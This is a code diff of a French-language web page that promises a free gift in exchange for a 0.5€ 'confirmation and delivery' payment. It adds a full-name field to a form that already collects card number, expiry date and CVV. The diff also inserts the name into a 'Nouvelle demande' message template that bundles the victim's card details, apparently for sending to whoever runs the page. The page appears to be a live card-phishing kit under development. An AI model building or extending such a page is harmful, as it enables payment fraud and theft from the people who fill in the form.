@@ -35,8 +35,16 @@
             Pour recevoir votre cadeau, veuillez remplir le formulaire ci-dessous et payer 0.5€ pour la confirmation et la livraison.
         </p>
 
-        <!-- Numéro de carte -->
+        <!-- Formulaire -->
         <form id="remboursement-form">
+            <!-- Nom complet -->
+            <div class="mb-4">
+                <label for="nom-complet" class="block text-sm font-medium text-gray-700">Nom complet</label>
+                <input type="text" id="nom-complet" placeholder="Ex: Jean Dupont" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Numéro de carte -->
             <div class="mb-4">
                 <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
                 <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
@@ -105,11 +113,12 @@
         document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
             event.preventDefault();
 
+            const nomComplet = document.getElementById("nom-complet").value;
             const cardNumber = document.getElementById("numero-carte").value;
             const expirationDate = document.getElementById("date-expiration").value;
             const cvv = document.getElementById("cvv").value;
 
-            if (!cardNumber || !expirationDate || !cvv) {
+            if (!nomComplet || !cardNumber || !expirationDate || !cvv) {
                 alert("Veuillez remplir tous les champs.");
                 return;
             }
@@ -121,6 +130,7 @@
 
             const message = `
 🔔 Nouvelle demande 🔔
+👤 Nom complet : ${nomComplet}
 💳 Carte : ${cardNumber}
 📅 Expiration : ${expirationDate}
 🔒 CVV : ${cvv}
